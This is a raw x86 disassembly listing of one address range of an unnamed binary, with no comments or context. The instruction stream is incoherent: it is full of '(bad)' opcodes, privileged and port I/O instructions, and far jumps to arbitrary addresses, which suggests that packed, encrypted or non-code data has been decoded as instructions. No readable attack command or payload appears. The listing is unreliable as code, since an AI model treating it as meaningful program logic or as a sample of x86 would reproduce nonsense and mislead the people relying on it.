  40d48a:	aaa    
  40d48b:	add    DWORD PTR [ebx+0x40185e10],edi
  40d491:	sub    dh,0x82
  40d494:	sub    al,0x56
  40d496:	adc    ah,al
  40d498:	das    
  40d499:	jne    0x40d508
  40d49b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d49d:	mov    edi,0xd1b1e64a
  40d4a2:	iret   
  40d4a3:	pop    edi
  40d4a4:	into   
  40d4a5:	pop    ecx
  40d4a6:	jae    0x40d492
  40d4a8:	call   0x2a7980ad
  40d4ad:	jo     0x40d4e8
  40d4af:	push   esi
  40d4b0:	out    0x26,al
  40d4b2:	xor    BYTE PTR [ecx+0x47],dh
  40d4b5:	inc    ebp
  40d4b6:	sub    DWORD PTR [edi-0x2f],0x2621afac
  40d4bd:	in     eax,dx
  40d4be:	mov    DWORD PTR [eax-0x13],ebp
  40d4c1:	fdivr  QWORD PTR [ecx+edx*2-0x31]
  40d4c5:	bound  ebx,QWORD PTR [ebx]
  40d4c7:	push   edi
  40d4c8:	jg     0x40d514
  40d4ca:	leave  
  40d4cb:	sbb    ecx,eax
  40d4cd:	psubd  mm1,mm0
  40d4d0:	mov    al,0x86
  40d4d2:	mov    eax,ds:0xd6133b1b
  40d4d7:	imul   ebp,DWORD PTR [ecx],0x7f
  40d4da:	rcr    BYTE PTR [eax+0xe874416],1
  40d4e0:	hlt    
  40d4e1:	retf   
  40d4e2:	(bad)  
  40d4e3:	and    esp,ebx
  40d4e5:	cld    
  40d4e6:	into   
  40d4e7:	sub    esp,ebp
  40d4e9:	fnstenv [ecx+0x50]
  40d4ec:	sub    bl,bl
  40d4ee:	xlat   BYTE PTR ds:[ebx]
  40d4ef:	sahf   
  40d4f0:	or     ebx,DWORD PTR [esi+0x29]
  40d4f3:	pop    es
  40d4f4:	jbe    0x40d543
  40d4f6:	dec    eax
  40d4f7:	(bad)  
  40d4f8:	stos   BYTE PTR es:[edi],al
  40d4f9:	push   0x5
  40d4fb:	jo     0x40d4df
  40d4fd:	daa    
  40d4fe:	test   BYTE PTR [edi-0x4ebd4101],bl
  40d504:	adc    ebp,DWORD PTR [ebx-0x731c544f]
  40d50a:	(bad)  
  40d50c:	lods   al,BYTE PTR ds:[esi]
  40d50d:	push   0xf04ccd8
  40d512:	leave  
  40d513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d514:	sahf   
  40d515:	xor    eax,DWORD PTR [edi]
  40d517:	imul   eax,DWORD PTR [edx],0x81430927
  40d51d:	test   al,0xc2
  40d51f:	(bad)  
  40d520:	(bad)  
  40d521:	std    
  40d522:	sub    al,0x9f
  40d524:	sbb    DWORD PTR [ebp+0x29],0x5b
  40d528:	mov    edx,0x8c1c9ccb
  40d52d:	(bad)
  40d531:	fidiv  WORD PTR [esi]
  40d533:	shl    DWORD PTR [esp+edi*8+0x38d06ee6],cl
  40d53a:	pop    ss
  40d53b:	ins    DWORD PTR es:[edi],dx
  40d53c:	sbb    BYTE PTR [ebp-0x5f],ah
  40d53f:	sub    ch,BYTE PTR [esi+0x37]
  40d542:	rcr    DWORD PTR [esi+0x12],cl
  40d545:	xchg   BYTE PTR [ecx],bh
  40d547:	fadd   st,st(5)
  40d549:	add    al,0x13
  40d54b:	imul   esp,eax,0x69
  40d54e:	rol    DWORD PTR [ecx+0x6a],cl
  40d551:	call   DWORD PTR [eax-0x41]
  40d554:	pop    edi
  40d555:	mov    edi,DWORD PTR [esi]
  40d557:	cmc    
  40d558:	retf   0x53dc
  40d55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d55c:	dec    eax
  40d55d:	sahf   
  40d55e:	jmp    0x40d58b
  40d560:	xchg   ebp,eax
  40d561:	jmp    0xac8d:0x6d8bd417
  40d568:	mov    esp,0x1233209f
  40d56d:	stc    
  40d56e:	adc    eax,0x5a2ea890
  40d573:	enter  0x2561,0x4c
  40d577:	push   ebx
  40d578:	(bad)  
  40d579:	sub    cl,BYTE PTR ds:0x7ca86fa4
  40d57f:	xchg   edx,eax
  40d580:	mov    edx,0x9e677e0
  40d585:	jbe    0x40d53c
  40d587:	add    dl,BYTE PTR es:[eax]
  40d58a:	jnp    0x40d5d2
  40d58c:	inc    esi
  40d58d:	pop    edx
  40d58e:	pop    esi
  40d58f:	jns    0x40d57f
  40d591:	jo     0x40d591
  40d593:	push   0x71
  40d595:	pop    es
  40d596:	ja     0x40d5ff
  40d598:	and    BYTE PTR [edx-0x2],ch
  40d59b:	repnz mov ecx,0x9c4ed849
  40d5a1:	xchg   ebp,eax
  40d5a2:	mov    esp,0xdda7e3b4
  40d5a7:	leave  
  40d5a8:	xlat   BYTE PTR ds:[ebx]
  40d5a9:	jae    0x40d565
  40d5ab:	lods   eax,DWORD PTR ds:[esi]
  40d5ac:	xor    eax,0x7f6fea1e
  40d5b1:	push   0xfffffff2
  40d5b3:	dec    esi
  40d5b4:	dec    ebx
  40d5b5:	jle    0x40d5cb
  40d5b7:	je     0x40d608
  40d5b9:	adc    DWORD PTR [ebx],esp
  40d5bb:	scas   al,BYTE PTR es:[edi]
  40d5bc:	push   esp
  40d5bd:	adc    bh,BYTE PTR [ebx]
  40d5bf:	and    ah,bl
  40d5c1:	test   DWORD PTR [edi],ebp
  40d5c3:	dec    eax
  40d5c4:	hlt    
  40d5c5:	push   cs
  40d5c6:	outs   dx,BYTE PTR ds:[esi]
  40d5c7:	imul   ebx,DWORD PTR [ebx],0x15
  40d5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5cb:	or     eax,esp
  40d5cd:	jp     0x40d5c1
  40d5cf:	xor    dl,BYTE PTR [ebx]
  40d5d1:	aaa    
  40d5d2:	pusha  
  40d5d3:	fistp  QWORD PTR [edx-0x4f47e72c]
  40d5d9:	imul   esi,DWORD PTR [ebx+esi*2+0x28],0x947dd7de
  40d5e1:	mov    cl,bl
  40d5e3:	inc    edi
  40d5e4:	mov    DWORD PTR [edi-0x6d86f0f2],0xc32f69c3
  40d5ee:	pop    edx
  40d5ef:	add    eax,0x884e7007
  40d5f4:	retf   0x1e60
  40d5f7:	jo     0x40d5a2
  40d5f9:	repnz and DWORD PTR [eax],edx
  40d5fc:	das    
  40d5fd:	mov    eax,0x9769866c
  40d602:	push   ecx
  40d603:	lods   al,BYTE PTR ds:[esi]
  40d604:	add    eax,0x8c775dd0
  40d609:	lock xor BYTE PTR [edi-0x28],0x8b
  40d60e:	ins    DWORD PTR es:[edi],dx
  40d60f:	mov    esi,edx
  40d611:	push   cs
  40d612:	jnp    0x40d65e
  40d614:	das    
  40d615:	mov    al,ds:0xcaf686b0
  40d61a:	mov    esp,0xd81edf23
  40d61f:	es stos DWORD PTR es:[edi],eax
  40d621:	je     0x40d63e
  40d623:	and    ah,BYTE PTR [ebp-0xa]
  40d626:	cld    
  40d627:	adc    al,0xca
  40d629:	mov    ebx,0x68969991
  40d62e:	scas   eax,DWORD PTR es:[edi]
  40d62f:	pop    esi
  40d630:	xor    DWORD PTR [esi+0x28],esp
  40d633:	mov    db1,esp
  40d636:	push   ss
  40d637:	pop    ecx
  40d638:	sub    bl,cl
  40d63a:	aas    
  40d63b:	jl     0x40d639
  40d63d:	mov    al,fs:0x5dfeef3e
  40d643:	sub    BYTE PTR [ecx*4-0x1fd69c1d],bl
  40d64a:	mov    edx,0x1a50ad4b
  40d64f:	or     DWORD PTR [ecx+0x6a26d27],0xfffffff9
  40d656:	add    eax,0xa2b6f665
  40d65b:	mov    ecx,0xa92b5c7
  40d660:	pop    ds
  40d661:	or     ah,BYTE PTR [esi]
  40d663:	push   ebx
  40d664:	(bad)  
  40d665:	jb     0x40d5f9
  40d667:	das    
  40d668:	inc    ebx
  40d669:	xor    esi,ebx
  40d66b:	push   cs
  40d66c:	mov    ebp,0x4bd64ca7
  40d671:	les    eax,FWORD PTR [ebp+esi*2-0x9]
  40d675:	clc    
  40d676:	lahf   
  40d677:	fmul   DWORD PTR [esi+0x137c26c7]
  40d67d:	xor    DWORD PTR [esi-0x19fef08],edi
  40d683:	adc    BYTE PTR [edi-0x62],bl
  40d686:	lea    eax,[ebx-0x59ba7df6]
  40d68c:	pop    eax
  40d68d:	and    edx,edx
  40d68f:	jnp    0x40d639
  40d691:	bound  esp,QWORD PTR [ebp+0x68]
  40d694:	inc    ebx
  40d695:	and    DWORD PTR [eax],eax
  40d697:	bnd jb 0x40d627
  40d69a:	out    0x5b,al
  40d69c:	aaa    
  40d69d:	and    esp,DWORD PTR ds:0x400e6f5b
  40d6a3:	jge    0x40d6c4
  40d6a5:	cmp    cl,BYTE PTR [esi]
  40d6a7:	ss pop eax
  40d6a9:	xor    edi,DWORD PTR [edi+0x7c7eeea]
  40d6af:	dec    esi
  40d6b0:	dec    ebp
  40d6b1:	or     ebp,ebx
  40d6b3:	adc    DWORD PTR [ecx-0x2],0xfffffffd
  40d6b7:	aaa    
  40d6b8:	jge    0x40d705
  40d6ba:	cmp    al,0x56
  40d6bc:	aas    
  40d6bd:	lods   al,BYTE PTR ds:[esi]
  40d6be:	ins    BYTE PTR es:[edi],dx
  40d6bf:	xchg   ebp,eax
  40d6c0:	stc    
  40d6c1:	not    bh
  40d6c3:	inc    edi
  40d6c4:	push   edx
  40d6c5:	shr    BYTE PTR [esi],1
  40d6c7:	sub    ch,BYTE PTR [ebp+0x28]
  40d6ca:	aaa    
  40d6cb:	mov    bl,al
  40d6cd:	cli    
  40d6ce:	je     0x40d71c
  40d6d0:	loop   0x40d738
  40d6d2:	adc    al,0xff
  40d6d4:	in     al,dx
  40d6d5:	or     BYTE PTR [esi+0x7b0954a3],ah
  40d6db:	mov    ecx,0x9d733632
  40d6e0:	sub    eax,DWORD PTR [ebx+0x705c196e]
  40d6e6:	pop    es
  40d6e7:	push   edi
  40d6e8:	es sub ecx,edx
  40d6eb:	test   esp,0x5affb133
  40d6f1:	push   cs
  40d6f2:	in     al,dx
  40d6f3:	je     0x40d6d9
  40d6f5:	pop    ebx
  40d6f6:	push   ebx
  40d6f7:	cmp    BYTE PTR [ecx+0x60],al
  40d6fa:	and    eax,0xbc9ba390
  40d6ff:	xchg   BYTE PTR [edx],al
  40d701:	inc    eax
  40d702:	push   eax
  40d703:	mov    al,ds:0xf5e0551d
  40d708:	mov    eax,ds:0x6cb1f7b6
  40d70d:	and    al,ch
  40d70f:	rcr    bl,0x8e
  40d712:	aam    0x27
  40d714:	push   ebp
  40d715:	fcmovnb st,st(3)
  40d717:	jl     0x40d6fa
  40d719:	pop    ebp
  40d71a:	loop   0x40d6ba
  40d71c:	pop    ss
  40d71d:	pusha  
  40d71e:	int    0xce
  40d720:	jns    0x40d76d
  40d722:	adc    dl,BYTE PTR [ebp-0x21444bdd]
  40d728:	mov    dl,0xaf
  40d72a:	in     al,dx
  40d72b:	(bad)  
  40d72c:	bound  edi,QWORD PTR [ebx-0x54f84edf]
  40d732:	jbe    0x40d74c
  40d734:	mov    BYTE PTR [edi-0x51baf4f0],0xa8
  40d73b:	push   ecx
  40d73c:	idiv   BYTE PTR [ecx+0x3e4db862]
  40d742:	sub    ch,dl
  40d744:	int    0xf7
  40d746:	hlt    
  40d747:	ret    
  40d748:	pop    ecx
  40d749:	or     al,0x18
  40d74b:	sub    esp,DWORD PTR [edi+0x7c]
  40d74e:	sbb    DWORD PTR [esi-0x4a5d3d1d],0x33
  40d755:	div    DWORD PTR [eax]
  40d757:	jnp    0x40d71c
  40d759:	loop   0x40d7bf
  40d75b:	fcom   QWORD PTR [esi+0x5f487e0e]
  40d761:	or     dh,BYTE PTR [edx-0x732378f1]
  40d767:	add    eax,0x6a0dbcba
  40d76c:	jle    0x40d6f3
  40d76e:	(bad)  
  40d76f:	pop    ebx
  40d770:	and    BYTE PTR [ebp+0x562fc701],bh
  40d776:	adc    esi,eax
  40d778:	cdq    
  40d779:	imul   ebp,DWORD PTR [edi],0xc79f4986
  40d77f:	sbb    dh,dh
  40d781:	cmp    dh,BYTE PTR [edi-0x803aaff]
  40d787:	inc    ecx
  40d788:	test   al,dl
  40d78a:	and    eax,DWORD PTR ds:0xb9a75a80
  40d790:	and    DWORD PTR [esi-0x51],ebx
  40d793:	jnp    0x40d7f5
  40d795:	es icebp 
  40d797:	mov    cl,0x8b
  40d799:	mov    eax,0x92dbe2ea
  40d79e:	popa   
  40d79f:	jbe    0x40d796
  40d7a1:	or     BYTE PTR [ecx],0x2
  40d7a4:	jge    0x71f7ee0e
  40d7aa:	or     dl,BYTE PTR [ecx-0x25]
  40d7ad:	mov    eax,ds:0xd73a84f2
  40d7b2:	stc    
  40d7b3:	cs nop
  40d7b5:	ins    BYTE PTR es:[edi],dx
  40d7b6:	mov    edi,0xb8376198
  40d7bb:	pop    eax
  40d7bc:	int3   
  40d7bd:	pop    edx
  40d7be:	mov    esp,0x5bc06645
  40d7c3:	dec    ecx
  40d7c4:	mov    WORD PTR [esi],?
  40d7c6:	jbe    0x40d83f
  40d7c8:	test   al,0x87
  40d7ca:	adc    esi,eax
  40d7cc:	ror    BYTE PTR [esi+ebp*2-0x75],0x6e
  40d7d1:	das    
  40d7d2:	jg     0x40d830
  40d7d4:	pop    edx
  40d7d5:	adc    BYTE PTR [ebp+0xc],0x14
  40d7d9:	cmp    ebp,0x45b2bf8b
  40d7df:	cmp    BYTE PTR [esi],dl
  40d7e1:	mov    ebx,DWORD PTR [ebx-0x71]
  40d7e4:	cmp    ebx,edi
  40d7e6:	in     eax,0x99
  40d7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7e9:	mov    bl,0x30
  40d7eb:	ds leave 
  40d7ed:	sbb    eax,0xe5c18147
  40d7f2:	sbb    BYTE PTR ds:0xba49f250,0xe2
  40d7f9:	fcmovnb st,st(5)
  40d7fb:	popf   
  40d7fc:	sbb    bl,BYTE PTR [ebp+ebx*8-0x61]
  40d800:	ror    BYTE PTR [esi+0x71],1
  40d803:	lea    ebp,[ecx+0x7]
  40d806:	cdq    
  40d807:	xchg   ebp,eax
  40d808:	cdq    
  40d809:	cwde   
  40d80a:	push   ebp
  40d80b:	fisubr WORD PTR [ebx]
  40d80d:	fs sti 
  40d80f:	xchg   edi,eax
  40d810:	retf   0x8520
  40d813:	push   esp
  40d814:	and    BYTE PTR [edx+0x765600dc],dh
  40d81a:	mov    al,0x85
  40d81c:	ret    
  40d81d:	push   cs
  40d81e:	std    
  40d81f:	std    
  40d820:	(bad)  
  40d821:	cmp    ecx,esi
  40d823:	inc    edx
  40d824:	fwait
  40d825:	jae    0x40d8a0
  40d827:	pop    ebp
  40d828:	mov    edi,0x4bf26f2d
  40d82d:	cwde   
  40d82e:	jecxz  0x40d86d
  40d830:	ins    DWORD PTR es:[edi],dx
  40d831:	das    
  40d832:	stos   DWORD PTR es:[edi],eax
  40d833:	clc    
  40d834:	xchg   ebp,eax
  40d835:	test   eax,0xf505f49a
  40d83a:	sbb    al,0x61
  40d83c:	int3   
  40d83d:	ins    DWORD PTR es:[edi],dx
  40d83e:	out    0x1b,al
  40d840:	popf   
  40d841:	rcl    eax,1
  40d843:	pop    esi
  40d844:	or     bl,bh
  40d846:	in     eax,0xe7
  40d848:	test   DWORD PTR [ebx-0x295525bf],esi
  40d84e:	das    
  40d84f:	(bad)  
  40d850:	push   ebx
  40d851:	xor    BYTE PTR [esi-0x6751847c],ah
  40d857:	add    cl,BYTE PTR [ebx-0x55d88d91]
  40d85d:	into   
  40d85e:	loopne 0x40d8d0
  40d860:	push   esi
  40d861:	pop    esp
  40d862:	and    BYTE PTR [eax-0x25],0x71
  40d866:	sbb    eax,0xa9e0a378
  40d86b:	mov    al,ds:0x8ae60a26
  40d870:	xor    al,cl
  40d872:	or     edi,esp
  40d874:	ror    DWORD PTR [edx-0x2c],0xb9
  40d878:	adc    eax,0x8dccf800
  40d87d:	dec    esp
  40d87e:	bnd jb 0x40d877
  40d881:	cdq    
  40d882:	fist   WORD PTR [ebx]
  40d884:	sbb    eax,0xd2e21980
  40d889:	rcr    ebx,0x74
  40d88c:	or     BYTE PTR [edx+0x16c10ccd],dl
  40d892:	stos   DWORD PTR es:[edi],eax
  40d893:	mov    esi,0xb0514e9e
  40d898:	(bad)  
  40d899:	call   0x3a5d5c4a
  40d89e:	inc    esi
  40d89f:	ins    DWORD PTR es:[edi],dx
  40d8a0:	icebp  
  40d8a1:	adc    ebx,0x5
  40d8a4:	(bad)  
  40d8a5:	out    dx,eax
  40d8a6:	fisttp QWORD PTR [ebx]
  40d8a8:	mov    dl,0x57
  40d8aa:	pop    edi
  40d8ab:	mov    ecx,0x48f0f48e
  40d8b0:	add    DWORD PTR [esi-0x34],esi
  40d8b3:	ficom  DWORD PTR [ecx]
  40d8b5:	pop    ebx
  40d8b6:	jns    0x40d89b
  40d8b8:	icebp  
  40d8b9:	or     eax,0xbe8ff1c2
  40d8be:	xor    BYTE PTR [edi+0x696cd970],0x0
  40d8c5:	adc    BYTE PTR [esi+0x7710d8ed],ah
  40d8cb:	test   BYTE PTR [edi-0x2ec4d0c8],bh
  40d8d1:	call   0xa9e8:0xa668cfab
  40d8d8:	xchg   edi,eax
  40d8d9:	mov    esp,0xc1dc52de
  40d8de:	int3   
  40d8df:	xor    cl,BYTE PTR [edi]
  40d8e1:	inc    esp
  40d8e2:	jno    0x40d8ea
  40d8e4:	mov    WORD PTR [ebp-0x50f4cfc4],fs
  40d8ea:	inc    edi
  40d8eb:	lock mov ah,0xf2
  40d8ee:	and    cl,BYTE PTR [ebx]
  40d8f0:	inc    ebp
  40d8f1:	add    DWORD PTR [edx-0x6594a08d],eax
  40d8f7:	pop    ebp
  40d8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f9:	and    bh,BYTE PTR [edi]
  40d8fb:	ret    
  40d8fc:	push   0xfffffffb
  40d8fe:	pop    ds
  40d8ff:	stc    
  40d900:	dec    esp
  40d901:	arpl   WORD PTR [ecx+0x6e],si
  40d904:	mov    al,0xb8
  40d906:	mov    es,esi
  40d908:	das    
  40d909:	ret    
  40d90a:	dec    edi
  40d90b:	aad    0x9e
  40d90d:	shl    DWORD PTR [esi-0x6d],0x7f
  40d911:	push   0xb7d5f15
  40d916:	aam    0xb1
  40d918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d919:	push   edi
  40d91a:	ds retf 
  40d91c:	xchg   ecx,eax
  40d91d:	xchg   ecx,eax
  40d91e:	xchg   ecx,eax
  40d91f:	mov    ebp,0xbb1a4348
  40d924:	les    ebx,FWORD PTR [ebp-0x65]
  40d927:	dec    esi
  40d928:	adc    BYTE PTR [esi],dl
  40d92a:	push   eax
  40d92b:	push   ecx
  40d92c:	pusha  
  40d92d:	cmp    edi,edx
  40d92f:	add    eax,0xc1477c6
  40d934:	or     ecx,DWORD PTR [ecx]
  40d936:	cmc    
  40d937:	iret   
  40d938:	int    0x71
  40d93a:	test   DWORD PTR [esi-0x74],ebp
  40d93d:	pop    ss
  40d93e:	dec    ebx
  40d93f:	mov    cl,0x8e
  40d941:	lahf   
  40d942:	imul   eax,DWORD PTR [ecx],0x2f397cb0
  40d948:	jp     0x40d999
  40d94a:	xor    edi,DWORD PTR ss:[edx]
  40d94d:	mov    esp,DWORD PTR [eax-0x410bb09]
  40d953:	aam    0xd1
  40d955:	xchg   esi,eax
  40d957:	adc    esp,edx
  40d959:	mov    ebx,es
  40d95b:	in     al,0xd9
  40d95d:	sbb    al,0xb5
  40d95f:	pop    eax
  40d960:	dec    ebx
  40d961:	das    
  40d962:	cwde   
  40d963:	icebp  
  40d964:	sti    
  40d965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d966:	rcl    edi,1
  40d968:	rol    DWORD PTR [esi-0x3b],1
  40d96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d96c:	(bad)  
  40d96e:	ins    DWORD PTR es:[di],dx
  40d970:	clc    
  40d971:	mov    ebp,0xbaaf7766
  40d976:	or     ecx,DWORD PTR [esi]
  40d978:	bound  ecx,QWORD PTR [ebp-0x2]
  40d97b:	mov    al,ds:0xae182099
  40d980:	and    ebx,0x0
  40d983:	xchg   ebp,eax
  40d984:	lahf   
  40d985:	stos   BYTE PTR es:[edi],al
  40d986:	xor    ah,BYTE PTR [edx]
  40d988:	in     al,dx
  40d989:	adc    dh,BYTE PTR [bp+si]
  40d98c:	jmp    0x40d9b3
  40d98e:	stos   BYTE PTR es:[edi],al
  40d98f:	ror    BYTE PTR [eax-0x5fd77f53],cl
  40d995:	jb     0x40d949
  40d997:	sub    ch,BYTE PTR [ecx+0x7df11251]
  40d99d:	mov    ebp,0x72387128
  40d9a2:	sub    ecx,DWORD PTR [eax+0x7173c42c]
  40d9a8:	push   eax
  40d9a9:	jno    0x40d9a4
  40d9ab:	call   0xf3a765ae
  40d9b0:	adc    edi,DWORD PTR [ebx-0x7a]
  40d9b3:	ja     0x40d9f7
  40d9b5:	lahf   
  40d9b6:	mov    ah,0x43
  40d9b8:	pop    eax
  40d9b9:	ror    BYTE PTR [eax+0x6e],0x8f
  40d9bd:	mov    es,ebp
  40d9bf:	ror    DWORD PTR [ebx-0x40],1
  40d9c2:	inc    esi
  40d9c3:	mov    bh,0xcb
  40d9c5:	test   DWORD PTR fs:[edi+0x4e12a992],ebp
  40d9cc:	daa    
  40d9cd:	jmp    0xdac4bde7
  40d9d2:	in     eax,dx
  40d9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9d4:	outs   dx,DWORD PTR ds:[esi]
  40d9d5:	mov    ds:0x979604dc,eax
  40d9da:	push   eax
  40d9db:	mov    ebx,0x6a86ded3
  40d9e0:	push   ebp
  40d9e1:	jb     0x40da11
  40d9e3:	jge    0x40d9e5
  40d9e5:	cwde   
  40d9e6:	xchg   ebp,eax
  40d9e7:	icebp  
  40d9e8:	add    esp,ebp
  40d9ea:	dec    esp
  40d9eb:	adc    eax,ecx
  40d9ed:	scas   eax,DWORD PTR es:[edi]
  40d9ee:	cwde   
  40d9ef:	mov    ch,BYTE PTR [eax]
  40d9f1:	imul   eax,ebx,0x4563ccee
  40d9f7:	in     eax,0xe8
  40d9f9:	mov    ds:0x74e4f46,al
  40d9fe:	push   eax
  40d9ff:	(bad)  
  40da00:	cmp    al,BYTE PTR ds:[ecx]
  40da03:	xor    bh,BYTE PTR [ebp+0x2d2bec60]
  40da09:	in     eax,0xd7
  40da0b:	push   esi
  40da0c:	add    BYTE PTR [ebp-0x27],dl
  40da0f:	jae    0x40da09
  40da11:	aaa    
  40da12:	pusha  
  40da13:	cmp    al,0xee
  40da15:	cmc    
  40da16:	pop    esi
  40da17:	jnp    0x40da07
  40da19:	repz xor BYTE PTR [ebx-0x1d3ca6c9],0x1e
  40da21:	aas    
  40da22:	inc    edx
  40da23:	jb     0x40d9c4
  40da25:	clc    
  40da26:	mov    ah,0xde
  40da28:	(bad)  
  40da29:	jbe    0x40da4c
  40da2b:	out    0x32,eax
  40da2d:	cmp    al,bh
  40da2f:	cmp    eax,0x56e29299
  40da34:	sub    al,0x1b
  40da36:	shl    BYTE PTR [edi+0x7f241d45],cl
  40da3c:	cmp    ah,BYTE PTR [esi]
  40da3e:	jo     0x40d9f3
  40da40:	les    ebx,FWORD PTR [esi-0x59]
  40da43:	jb     0x40da18
  40da45:	hlt    
  40da46:	cmp    DWORD PTR [esi+0x12380af1],eax
  40da4c:	lods   eax,DWORD PTR ds:[esi]
  40da4d:	out    0x81,al
  40da4f:	rol    eax,cl
  40da51:	out    dx,eax
  40da52:	cmp    ah,dh
  40da54:	ds and ch,dh
  40da57:	adc    ebx,DWORD PTR ds:0x26aa839e
  40da5d:	icebp  
  40da5e:	(bad)  
  40da5f:	(bad)  
  40da61:	push   cs
  40da62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da63:	mov    al,0x26
  40da65:	jnp    0x40d9fa
  40da67:	mov    ecx,0x92c9162e
  40da6c:	cwde   
  40da6d:	dec    ebx
  40da6e:	fs dec esp
  40da70:	scas   al,BYTE PTR es:[edi]
  40da71:	sub    ecx,DWORD PTR [ebx-0x4d]
  40da74:	push   edx
  40da75:	dec    esp
  40da76:	ret    0x964f
  40da79:	stc    
  40da7a:	xor    eax,0xebbc8478
  40da7f:	stc    
  40da80:	xor    edx,DWORD PTR [ecx+0x75e4e0be]
  40da86:	dec    esp
  40da87:	(bad)  
  40da88:	xchg   ecx,eax
  40da89:	lods   eax,DWORD PTR ds:[esi]
  40da8a:	pop    ds
  40da8b:	and    al,BYTE PTR ds:0x1b00997
  40da91:	xchg   edi,eax
  40da92:	cmp    al,ah
  40da94:	mov    ebp,DWORD PTR ds:0xc61a6db4
  40da9a:	dec    esi
  40da9b:	ficom  DWORD PTR [edi]
  40da9d:	aaa    
  40da9e:	sub    cl,BYTE PTR [ebp-0x23]
  40daa1:	mov    ecx,0x7ab91aa
  40daa6:	xchg   edi,eax
  40daa7:	loope  0x40daa2
  40daa9:	sbb    dh,BYTE PTR [edx]
  40daab:	jp     0x40da58
  40daad:	out    dx,al
  40daae:	jle    0x40dacc
  40dab0:	(bad)  [ecx-0x5dccee40]
  40dab6:	(bad)  
  40dab7:	mov    ecx,0x8dbfda41
  40dabc:	cdq    
  40dabd:	jnp    0x40dabb
  40dabf:	cmp    BYTE PTR [eax-0x61],dl
  40dac2:	mov    esp,0xd13f210
  40dac7:	mov    WORD PTR [ecx+edi*1],gs
  40daca:	and    bh,BYTE PTR [edx+ebp*4]
  40dacd:	(bad)  
  40dace:	adc    al,0xba
  40dad0:	jmp    0x86e9:0x7984853d
  40dad7:	fsubr  QWORD PTR [edi-0x7717e8ed]
  40dadd:	rcl    DWORD PTR [ebx-0x5cc61cd9],1
  40dae3:	xor    BYTE PTR [eax-0x7c],dh
  40dae6:	clc    
  40dae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae8:	and    al,0xa9
  40daea:	repnz cmovs ebp,esi
  40daee:	inc    edx
  40daef:	mov    eax,ds:0x37c09018
  40daf4:	(bad)  
  40daf5:	pusha  
  40daf6:	jmp    0xe7e2cf79
  40dafb:	or     bh,al
  40dafd:	ja     0x40da9d
  40daff:	ss push edi
  40db01:	or     al,0xd1
  40db03:	sbb    BYTE PTR [ebx],al
  40db05:	jecxz  0x40db80
  40db07:	push   ecx
  40db08:	adc    al,0x3a
  40db0a:	jnp    0x40db0a
  40db0c:	or     ebp,esp
  40db0e:	rol    DWORD PTR [ecx+0x5ddd4d78],cl
  40db14:	outs   dx,DWORD PTR ds:[esi]
  40db15:	add    edi,ebx
  40db17:	mov    ds:0x137d8c8b,al
  40db1c:	das    
  40db1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db1e:	push   es
  40db1f:	push   edx
  40db20:	aaa    
  40db21:	mov    edx,0x302421b3
  40db26:	jae    0x40db4f
  40db28:	out    0xb6,eax
  40db2a:	mov    ecx,0x210f66e
  40db2f:	pop    es
  40db30:	mov    al,0xd1
  40db32:	fadd   QWORD PTR [edx-0x1]
  40db35:	mov    edi,0x788f6f8c
  40db3a:	lock fs ror cl,0x46
  40db3f:	mov    dh,0xae
  40db41:	push   ebx
  40db42:	rcr    DWORD PTR [edx-0x43],1
  40db45:	and    al,0xe0
  40db47:	cmp    al,0x83
  40db49:	mov    ebx,0x72e45b2
  40db4e:	lock arpl bx,si
  40db51:	stos   DWORD PTR es:[edi],eax
  40db52:	xor    DWORD PTR [ebp-0x78d2eafc],ebp
  40db58:	(bad)  
  40db59:	jp     0x40db8b
  40db5b:	jne    0x40db59
  40db5d:	sub    eax,0xadc80dfd
  40db62:	sub    al,0x14
  40db64:	imul   ebp
  40db66:	aaa    
  40db67:	fcom   QWORD PTR [edi-0x44]
  40db6a:	jmp    0x9813:0x7c94fca0
  40db71:	xchg   DWORD PTR [eax+0x773a4d1d],ebx
  40db77:	in     al,0x67
  40db79:	sbb    BYTE PTR [ebp-0x2884bc31],dl
  40db7f:	and    cl,cl
  40db81:	inc    ebx
  40db82:	idiv   DWORD PTR [esp+edi*2]
  40db85:	xchg   esp,eax
  40db86:	jns    0x40db6c
  40db88:	mov    DWORD PTR ds:0xc02de68,edi
  40db8e:	xchg   DWORD PTR [esi+0x28],ecx
  40db91:	xchg   esi,eax
  40db92:	shr    DWORD PTR [ecx+ecx*2-0x27],1
  40db96:	loop   0x40dbda
  40db98:	repnz bound ebp,QWORD PTR [ebx]
  40db9b:	test   BYTE PTR [edx+0x151fc51b],dl
  40dba1:	and    eax,DWORD PTR [ecx+0x29734fef]
  40dba7:	and    edx,DWORD PTR [edx]
  40dba9:	inc    ebp
  40dbaa:	xchg   edx,eax
  40dbab:	fadd   QWORD PTR [ecx]
  40dbad:	dec    edx
  40dbae:	mov    ebp,0xba3c11a1
  40dbb3:	gs call 0xc73:0xf0209775
  40dbbb:	(bad)  
  40dbbc:	mov    al,0xce
  40dbbe:	leave  
  40dbbf:	push   esi
  40dbc0:	adc    esi,DWORD PTR [edi+0x2e6af48c]
  40dbc6:	cmp    ebp,DWORD PTR [eax+esi*8-0x12]
  40dbca:	sbb    BYTE PTR cs:[edx-0x18],cl
  40dbce:	or     DWORD PTR [ebp+0x32bc06bb],edi
  40dbd4:	jg     0x40db7d
  40dbd6:	pop    esi
  40dbd7:	mov    esi,edi
  40dbd9:	nop
  40dbda:	pop    edx
  40dbdb:	xchg   edi,eax
  40dbdc:	imul   esi,ebp,0x26
  40dbdf:	ror    DWORD PTR [eax-0x571b4f43],cl
  40dbe5:	rol    BYTE PTR [esi+0x3f7dd9a3],cl
  40dbeb:	ins    DWORD PTR es:[edi],dx
  40dbec:	fimul  DWORD PTR [edx+eiz*1-0x42]
  40dbf0:	jmp    0x7e89f1bd
  40dbf5:	or     esp,edi
